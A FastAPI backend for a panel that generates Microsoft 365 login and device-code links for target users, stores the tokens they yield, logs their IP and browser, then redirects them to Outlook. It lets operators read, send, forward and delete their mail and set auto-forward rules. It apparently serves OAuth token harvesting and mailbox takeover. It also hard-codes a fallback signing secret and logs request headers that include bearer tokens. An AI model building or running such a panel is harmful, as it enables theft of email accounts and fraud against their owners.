from fastapi import FastAPI, Request, Depends, HTTPException, status
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import logging
import os
import requests
from datetime import datetime, timedelta

from jose import jwt, JWTError

from auth import (
    generate_login_link,
    generate_mail_connect_link,
    generate_org_connect_link,
    generate_org_mail_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder,
)
from admin_auth import login_admin
from db import init_db, SessionLocal
from models import (
    Rule,
    TenantToken,
    RuleAction,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
)

app = FastAPI()

SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080

CLIENT_ID = os.environ.get("CLIENT_ID", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
READ_ONLY_MODE = os.environ.get("READ_ONLY_MODE", "true").lower() == "true"

security = HTTPBearer()


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token"
        )


def resolve_user_id(requested_user_id: str | None, user_payload: dict) -> str:
    return requested_user_id or user_payload["sub"]


def extract_tenant_hint(user_id: str | None) -> str:
    if not user_id:
        return ""
    if "@" in user_id:
        return user_id.split("@", 1)[1].strip().lower()
    return (user_id or "").strip().lower()


def parse_enterprise_notes(notes: str | None) -> dict:
    parsed = {
        "mode": "preview",
        "organization_name": "",
        "notes": notes or "",
    }
    if not notes:
        return parsed

    for part in notes.split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip().lower()
        value = value.strip()
        if key == "mode" and value:
            parsed["mode"] = value
        elif key in {"org", "organization", "organization_name"}:
            parsed["organization_name"] = value
        elif key == "notes":
            parsed["notes"] = value
    return parsed


def build_enterprise_notes(mode: str, organization_name: str | None, notes: str | None) -> str:
    safe_mode = (mode or "preview").strip() or "preview"
    safe_org = (organization_name or "").strip()
    safe_notes = (notes or "").strip()
    return f"mode={safe_mode};org={safe_org};notes={safe_notes}"


logging.basicConfig(level=logging.DEBUG)

origins = [
    "http://localhost:3000",
    "https://frontend-xg84.onrender.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.middleware("http")
async def log_requests(request: Request, call_next):
    logging.debug("\n--- REQUEST START ---")
    logging.debug(f"{request.method} {request.url}")
    logging.debug(f"Headers: {request.headers}")

    response = await call_next(request)

    logging.debug(f"Response Status: {response.status_code}")
    logging.debug("--- REQUEST END ---\n")

    return response


@app.on_event("startup")
def startup():
    init_db()


@app.get("/app-config")
def get_app_config():
    return {
        "read_only_mode": READ_ONLY_MODE,
        "device_code_preferred": True,
        "admin_consent_tenant": ADMIN_CONSENT_TENANT,
    }


@app.get("/dashboard/summary")
def dashboard_summary(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        saved_users_count = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .count()
        )

        connected_mailboxes_count = (
            db.query(TenantToken.tenant_id)
            .distinct()
            .count()
        )

        approved_tenants_count = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.APPROVED
            )
            .count()
        )

        pending_tenants_count = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.PENDING
            )
            .count()
        )

        enterprise_enabled_count = 0
        approved_rows = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.APPROVED
            )
            .all()
        )
        for row in approved_rows:
            mode = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
            if mode == "enterprise_full":
                enterprise_enabled_count += 1

        return {
            "saved_users_count": saved_users_count,
            "connected_mailboxes_count": connected_mailboxes_count,
            "approved_tenants_count": approved_tenants_count,
            "pending_tenants_count": pending_tenants_count,
            "enterprise_enabled_count": enterprise_enabled_count,
        }
    finally:
        db.close()


@app.post("/admin/login")
async def admin_login_route(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "Invalid JSON"}, status_code=400)

    username = body.get("username")
    password = body.get("password")

    result = login_admin(username, password)

    if not result or "error" in result:
        return JSONResponse(result or {"error": "Login failed"}, status_code=401)

    token = create_access_token({"sub": username})

    return {
        "access_token": token,
        "token_type": "bearer"
    }


@app.post("/tenant-consent/generate")
async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    admin_user_id = user["sub"]
    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=admin_user_id,
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending"
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": r.status.value if hasattr(r.status, "value") else str(r.status),
                    "admin_consent_url": r.admin_consent_url,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved"
    )

    return {"status": "approved", "tenant_hint": tenant_hint}


@app.get("/enterprise/status")
def enterprise_status(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        tenant_hint = extract_tenant_hint(user_id)

        if not tenant_hint:
            return {
                "tenant_hint": "",
                "mode": "preview",
                "consent_status": "none",
                "enterprise_enabled": False,
                "app_only_enabled": False,
                "notes": ""
            }

        row = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.tenant_hint == tenant_hint
            )
            .first()
        )

        if not row:
            return {
                "tenant_hint": tenant_hint,
                "mode": "preview",
                "consent_status": "none",
                "enterprise_enabled": False,
                "app_only_enabled": False,
                "notes": ""
            }

        parsed = parse_enterprise_notes(getattr(row, "notes", ""))

        return {
            "tenant_hint": tenant_hint,
            "mode": parsed["mode"],
            "consent_status": row.status.value if hasattr(row.status, "value") else str(row.status),
            "enterprise_enabled": parsed["mode"] == "enterprise_full" and row.status == TenantConsentStatus.APPROVED,
            "app_only_enabled": parsed["mode"] == "app_only" and row.status == TenantConsentStatus.APPROVED,
            "notes": parsed["notes"] or getattr(row, "notes", "") or ""
        }
    finally:
        db.close()


@app.get("/enterprise/tenants")
def list_enterprise_tenants(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )

        tenants = []
        for row in rows:
            parsed = parse_enterprise_notes(getattr(row, "notes", ""))
            tenants.append({
                "tenant_hint": row.tenant_hint,
                "organization_name": parsed["organization_name"] or "â",
                "mode": parsed["mode"],
                "consent_status": row.status.value if hasattr(row.status, "value") else str(row.status),
                "notes": parsed["notes"] or getattr(row, "notes", "") or "",
                "admin_consent_url": row.admin_consent_url,
                "created_at": row.created_at,
                "updated_at": row.updated_at,
            })

        return {"tenants": tenants}
    finally:
        db.close()


@app.post("/enterprise/onboard")
async def enterprise_onboard(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()
    mode = (body.get("mode") or "enterprise_full").strip()
    organization_name = (body.get("organization_name") or "").strip()
    notes = body.get("notes") or ""

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    admin_consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        admin_consent_url=admin_consent_url,
        status=TenantConsentStatus.PENDING,
        notes=build_enterprise_notes(mode, organization_name, notes)
    )

    return {
        "tenant_hint": tenant_hint,
        "mode": mode,
        "organization_name": organization_name,
        "admin_consent_url": admin_consent_url,
        "consent_status": "pending",
    }


@app.post("/enterprise/approve")
async def enterprise_approve(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()
    mode = (body.get("mode") or "enterprise_full").strip()
    organization_name = (body.get("organization_name") or "").strip()
    notes = body.get("notes") or "Manually approved"

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes=build_enterprise_notes(mode, organization_name, notes)
    )

    return {
        "tenant_hint": tenant_hint,
        "mode": mode,
        "organization_name": organization_name,
        "consent_status": "approved",
    }


@app.get("/login")
def login(user_id: str, user=Depends(verify_token)):
    return RedirectResponse(generate_login_link(user_id))


@app.get("/generate-login-url")
def generate_login_url(user_id: str, user=Depends(verify_token)):
    login_url = generate_login_link(user_id)
    return {
        "login_url": login_url,
        "user_id": user_id,
        "type": "direct_user_login"
    }


@app.get("/generate-mail-connect-url")
def generate_mail_connect_url(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        tenant_hint = extract_tenant_hint(user_id)
        mode = "preview"

        if tenant_hint:
            row = (
                db.query(TenantConsent)
                .filter(
                    TenantConsent.admin_user_id == user["sub"],
                    TenantConsent.tenant_hint == tenant_hint
                )
                .first()
            )
            if row:
                mode = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")

        login_url = generate_mail_connect_link(user_id, admin_user_id=user["sub"])

        return {
            "login_url": login_url,
            "user_id": user_id,
            "tenant_hint": tenant_hint,
            "mode": mode,
            "type": "mail_connect"
        }
    finally:
        db.close()


@app.get("/generate-org-connect-url")
def generate_org_connect_url(tenant_hint: str | None = None, user=Depends(verify_token)):
    admin_user_id = user["sub"]
    login_url = generate_org_connect_link(admin_user_id, tenant_hint)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint,
        "admin_user_id": admin_user_id,
        "type": "org_connect_invite"
    }


@app.get("/generate-org-mail-connect-url")
def generate_org_mail_connect_url_route(tenant_hint: str | None = None, user=Depends(verify_token)):
    admin_user_id = user["sub"]
    login_url = generate_org_mail_connect_link(admin_user_id, tenant_hint)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint,
        "admin_user_id": admin_user_id,
        "type": "org_mail_connect_invite"
    }


@app.get("/generate-admin-consent-url")
def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(verify_token)):
    return {
        "admin_consent_url": generate_admin_consent_url(tenant),
        "tenant": tenant or ADMIN_CONSENT_TENANT,
        "client_id": CLIENT_ID,
        "type": "admin_consent"
    }


@app.post("/device-code/start")
async def device_code_start(request: Request, user=Depends(verify_token)):
    admin_user_id = user["sub"]

    try:
        body = await request.json()
    except Exception:
        body = {}

    try:
        result = start_device_code_flow(
            mail_mode=bool(body.get("mail_mode")),
            user_id=body.get("user_id"),
            admin_user_id=admin_user_id,
        )
        return {
            "admin_user_id": admin_user_id,
            "user_id": body.get("user_id"),
            "mail_mode": bool(body.get("mail_mode")),
            **result
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/device-code/poll")
async def device_code_poll(request: Request, user=Depends(verify_token)):
    body = await request.json()
    device_code = body.get("device_code")

    if not device_code:
        raise HTTPException(status_code=400, detail="device_code is required")

    admin_user_id = body.get("admin_user_id") or user["sub"]
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        result = poll_device_code_flow(
            device_code=device_code,
            admin_user_id=admin_user_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        return result
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/microsoft/status")
def microsoft_status(user_id: str, user=Depends(verify_token)):
    token_record = get_token(user_id)
    connected = token_record is not None and bool(getattr(token_record, "refresh_token", None))

    inbox_connected = False

    if token_record and getattr(token_record, "access_token", None):
        try:
            test_res = requests.get(
                "https://graph.microsoft.com/v1.0/me/mailFolders?$top=1",
                headers={"Authorization": f"Bearer {token_record.access_token}"},
                timeout=15,
            )
            inbox_connected = test_res.status_code == 200
        except Exception:
            inbox_connected = False

    return {
        "user_id": user_id,
        "connected": connected,
        "inbox_connected": inbox_connected,
        "has_refresh_token": bool(token_record.refresh_token) if token_record else False,
        "expires_at": token_record.expires_at if token_record else None
    }


@app.get("/users")
def list_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        connected_rows = db.query(TenantToken.tenant_id).distinct().all()
        connected_users = [row[0] for row in connected_rows if row[0]]

        saved_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_users = [row[0] for row in saved_rows if row[0]]

        user_ids = sorted(set(connected_users + saved_users))
        return {"users": user_ids}
    finally:
        db.close()


@app.get("/saved-users")
def get_saved_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        rows = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .order_by(SavedUser.user_id.asc())
            .all()
        )

        return {
            "users": [
                {
                    "id": row.id,
                    "admin_user_id": row.admin_user_id,
                    "user_id": row.user_id,
                    "job_title": getattr(row, "job_title", None),
                    "created_at": row.created_at
                }
                for row in rows
            ]
        }
    finally:
        db.close()


@app.post("/saved-users")
async def add_saved_user(request: Request, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        body = await request.json()
        admin_user_id = user["sub"]
        target_user_id = (body.get("user_id") or "").strip()

        if not target_user_id:
            return JSONResponse({"error": "user_id is required"}, status_code=400)

        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id
            )
            .first()
        )

        if existing:
            return {"message": "User already saved", "user_id": target_user_id}

        row = SavedUser(
            admin_user_id=admin_user_id,
            user_id=target_user_id
        )
        db.add(row)
        db.commit()

        return {"message": "User saved", "user_id": target_user_id}
    finally:
        db.close()


@app.delete("/saved-users")
def delete_saved_user(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        row = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == user_id
            )
            .first()
        )

        if not row:
            return JSONResponse({"error": "Saved user not found"}, status_code=404)

        db.delete(row)
        db.commit()

        return {"message": "Saved user removed", "user_id": user_id}
    finally:
        db.close()


@app.get("/connect-invites")
def list_connect_invites(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        invites = (
            db.query(ConnectInvite)
            .filter(ConnectInvite.admin_user_id == admin_user_id)
            .order_by(ConnectInvite.created_at.desc())
            .all()
        )

        return {
            "invites": [
                {
                    "id": invite.id,
                    "admin_user_id": invite.admin_user_id,
                    "invite_token": invite.invite_token,
                    "tenant_hint": getattr(invite, "tenant_hint", None),
                    "resolved_user_id": invite.resolved_user_id,
                    "job_title": getattr(invite, "job_title", None),
                    "is_used": invite.is_used,
                    "created_at": getattr(invite, "created_at", None),
                    "used_at": invite.used_at
                }
                for invite in invites
            ]
        }
    finally:
        db.close()


@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        exchange_code_for_token(code, state, client_ip, user_agent)
        return RedirectResponse(url="https://outlook.office.com/mail/")
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.get("/emails")
def get_emails(
    user_id: str | None = None,
    folder_id: str | None = None,
    user=Depends(verify_token)
):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return {
            "emails": fetch_emails(resolved_user_id, folder_id)
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/folders")
def get_folders(user_id: str | None = None, user=Depends(verify_token)):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return {
            "folders": get_mail_folders(resolved_user_id)
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/email/{message_id}")
def email_detail(message_id: str, user_id: str | None = None, user=Depends(verify_token)):
    resolved_user_id = resolve_user_id(user_id, user)

    try:
        return get_email_detail(resolved_user_id, message_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/email/reply")
async def reply_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return reply_to_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("reply_text")
    )


@app.post("/email/send")
async def send_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return send_email(
        resolved_user_id,
        body.get("to"),
        body.get("subject"),
        body.get("body")
    )


@app.post("/email/forward")
async def forward_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return forward_email(
        resolved_user_id,
        body.get("message_id"),
        body.get("to")
    )


@app.post("/email/delete")
async def delete_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return delete_email(
        resolved_user_id,
        body.get("message_id")
    )


@app.post("/email/mark-read")
async def mark_read_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return mark_as_read(
        resolved_user_id,
        body.get("message_id"),
        body.get("is_read", True)
    )


@app.post("/email/move")
async def move_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    resolved_user_id = resolve_user_id(body.get("user_id"), user)

    return move_email_to_folder(
        resolved_user_id,
        body.get("message_id"),
        body.get("folder_id")
    )


@app.post("/rules")
async def add_rule(request: Request, user=Depends(verify_token)):
    body = await request.json()
    db = SessionLocal()

    try:
        resolved_user_id = resolve_user_id(body.get("user_id"), user)
        action_value = body.get("action")

        if not body.get("condition"):
            return JSONResponse({"error": "condition is required"}, status_code=400)

        if not body.get("keyword"):
            return JSONResponse({"error": "keyword is required"}, status_code=400)

        if not action_value:
            return JSONResponse({"error": "action is required"}, status_code=400)

        try:
            action_enum = RuleAction(action_value)
        except ValueError:
            return JSONResponse(
                {"error": "Invalid action. Allowed values: move, delete, forward"},
                status_code=400
            )

        if action_value == "move" and not body.get("target_folder"):
            return JSONResponse({"error": "target_folder is required for move action"}, status_code=400)

        if action_value == "forward" and not body.get("forward_to"):
            return JSONResponse({"error": "forward_to is required for forward action"}, status_code=400)

        rule = Rule(
            user_id=resolved_user_id,
            condition=body.get("condition"),
            keyword=body.get("keyword"),
            action=action_enum,
            target_folder=body.get("target_folder"),
            forward_to=body.get("forward_to"),
            is_active=body.get("is_active", True)
        )

        db.add(rule)
        db.commit()

        return {"message": "Rule created"}
    finally:
        db.close()


@app.get("/rules")
def get_rules(user_id: str | None = None, user=Depends(verify_token)):
    db = SessionLocal()

    try:
        resolved_user_id = resolve_user_id(user_id, user)

        rules = db.query(Rule).filter(Rule.user_id == resolved_user_id).all()

        result = [{
            "id": r.id,
            "user_id": r.user_id,
            "condition": r.condition,
            "keyword": r.keyword,
            "action": r.action.value,
            "target_folder": r.target_folder,
            "forward_to": r.forward_to,
            "is_active": r.is_active,
            "created_at": r.created_at
        } for r in rules]

        return {"rules": result}
    finally:
        db.close()
